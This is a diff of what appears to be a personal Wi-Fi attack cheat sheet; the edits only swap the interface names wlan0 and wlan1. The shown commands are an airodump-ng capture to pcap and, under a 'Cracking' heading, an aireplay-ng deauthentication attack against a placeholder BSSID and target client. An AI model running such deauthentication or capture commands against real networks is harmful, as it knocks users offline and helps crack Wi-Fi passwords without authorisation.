@@ -28,14 +28,14 @@ airodump-ng --manufacturer --beacons --showack --wps --uptime \
 ```bash
 airodump-ng --manufacturer --beacons --showack --wps --uptime \
             --band aba --bssid 00:00:00:00:00:00 --channel 1 \
-            --write-interval 5 --output-format pcap wlan1 --write session0
+            --write-interval 5 --output-format pcap wlan0 --write session0
 ```
 
 ## Cracking
 ```bash
-iwconfig wlan0 channel 4
+iwconfig wlan1 channel 4
 
-aireplay-ng -0 99 -D -a BSSID -c TARGET wlan0
+aireplay-ng -0 99 -D -a BSSID -c TARGET wlan1
 ```
 
 ## Kill View
